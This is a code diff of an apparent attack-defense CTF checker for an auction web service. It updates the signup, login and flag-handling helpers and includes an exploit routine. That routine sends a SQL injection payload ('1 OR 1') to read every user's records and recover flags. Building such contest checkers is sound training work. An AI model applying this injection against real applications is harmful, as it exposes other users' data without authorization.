@@ -38,32 +38,35 @@ checker = Enochecker("secureauction", 8181)
 app = lambda: checker.app
 
 
-async def signup(client: AsyncClient, user_name, password):
+async def signup(client: AsyncClient, user_name, password, user_type='REGULAR'):
     signup_data = {
         "user_name": user_name,
-        "password": password
+        "password": password,
+        "user_type": user_type,
+        "action": "signup"
     }
-    response = await client.post("/signup.php", data=signup_data)
+    response = await client.post("index.php", data=signup_data)
     status_code = response.status_code
-    if status_code == 200:
+    if status_code in [200, 302]:
         return
     else:
         raise MumbleException(f"Failed to sign up the user. {status_code}")
-
-
-async def login(client: AsyncClient, user_name, password):
+    
+async def login(client: AsyncClient, user_name, password, user_type='REGULAR'):
     login_data = {
         "user_name": user_name,
-        "password": password
+        "password": password,
+        "user_type": user_type,
+        "action": "login"
     }
+    await client.post("index.php", data=login_data)
 
-    await client.post("login.php", data=login_data)
 
-
-async def create_item(client: AsyncClient, item_name, start_price) -> int:
+async def create_item(client: AsyncClient, item_name, start_price, item_type) -> int:
     item_data = {
         "item_name": item_name,
-        "start_price": start_price
+        "start_price": start_price,
+        "item_type": item_type
     }
     response = await client.post("create_item.php", data=item_data)
     if response.status_code == 302:
@@ -95,12 +98,11 @@ async def putflag_note(
     user_name = ''.join(random.choices(string.ascii_lowercase, k=10))
     password = ''.join(random.choices(string.ascii_lowercase, k=10))
 
-    await signup(client, user_name, password)
-    await login(client, user_name, password)
+    await signup(client, user_name, password, 'REGULAR')
 
     item_name = ''.join(random.choices(string.ascii_lowercase, k=10))
 
-    item_id = await create_item(client, item_name, 0)
+    item_id = await create_item(client, item_name, 0,  'REGULAR')
     await place_bid(client, item_id, task.flag)
 
     await db.set("item", (user_name, password, item_name))
@@ -119,19 +121,20 @@ async def getflag_note(
         user_name, password, item_name = await db.get("item")
     except KeyError:
         raise MumbleException("Item missing")
-    await login(client, user_name, password)
+    await login(client, user_name, password, 'REGULAR')
 
-    response = await client.get("my_profile.php")
+    response = await client.get(f"my_profile.php")
     logger.debug(response.text)
 
     assert_in(task.flag, response.text, "Flag missing")
+
 
 @checker.exploit(0)
 async def exploit(
     task: ExploitCheckerTaskMessage,
     client: AsyncClient,
     searcher: FlagSearcher,
-    logger: LoggerAdapter  # add this parameter to your function
+    logger: LoggerAdapter  
 ) -> Optional[str]:
 
     user_name = ''.join(random.choices(string.ascii_lowercase, k=10))
@@ -141,7 +144,6 @@ async def exploit(
     logger.debug(f"Generated password: {password}")
 
     await signup(client, user_name, password)
-    await login(client, user_name, password)
 
     # SQL Injection payload, returning all records regardless of the user_id.
     SQL_INJECTION_PAYLOAD = "1 OR 1"
@@ -162,6 +164,5 @@ async def exploit(
         logger.warning("Exploit request failed.")
         raise MumbleException("Exploit Failed!")
 
-
-if __name__ == "main":
+if __name__ == "__main__":
     checker.run()
